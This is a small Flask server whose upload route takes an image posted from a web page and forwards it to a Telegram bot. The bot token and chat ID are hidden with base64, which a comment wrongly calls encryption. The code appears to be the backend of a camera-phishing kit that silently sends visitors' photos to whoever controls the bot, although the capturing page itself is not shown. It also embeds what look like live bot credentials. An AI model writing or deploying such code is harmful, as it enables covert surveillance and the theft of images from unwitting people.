from flask import Flask, render_template, request
import requests
import base64
import os

app = Flask(__name__)

# Encrypted token and chat_id
ENCODED_BOT = b'NzkxMjg5NDI4NzpBQUh1V1Y2dmo0WlNBWUd3UEgyVU5NU0wwWG1LendyM0pTWA=='
ENCODED_CHAT = b'NzE2NzM2MTEyNg=='

def decrypt(encoded):
    return base64.b64decode(encoded).decode()

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    try:
        data_url = request.form['image']
        header, encoded = data_url.split(",", 1)
        image_data = base64.b64decode(encoded)

        files = {'photo': ('photo.jpg', image_data, 'image/jpeg')}
        data = {'chat_id': decrypt(ENCODED_CHAT)}

        token = decrypt(ENCODED_BOT)
        url = f"https://api.telegram.org/bot{token}/sendPhoto"
        response = requests.post(url, data=data, files=files)

        return ('success', 200) if response.ok else ('fail', 500)
    except Exception as e:
        return (str(e), 500)

if __name__ == '__main__':
    app.run()
